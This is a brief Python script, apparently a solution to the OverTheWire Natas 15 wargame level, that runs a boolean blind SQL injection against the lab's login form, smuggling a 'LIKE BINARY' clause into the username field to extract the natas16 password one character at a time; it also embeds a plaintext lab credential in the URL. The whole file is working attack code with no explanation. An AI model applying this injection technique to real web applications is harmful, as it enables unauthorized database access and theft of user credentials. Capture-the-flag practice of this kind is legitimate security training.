import requests

connect_string = 'http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/index.php'
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
existsStr = 'This user exists.'
password = ''

for i in range(32):
	#print(i)
	for c in chars:
		#print(c)
		r = requests.post(connect_string, data={'username' : 'natas16" AND password LIKE BINARY "' + password + c + '%" "'})
		
		if r.content.find(existsStr) != -1:
				password += c
				print(password)
				break

print('done')
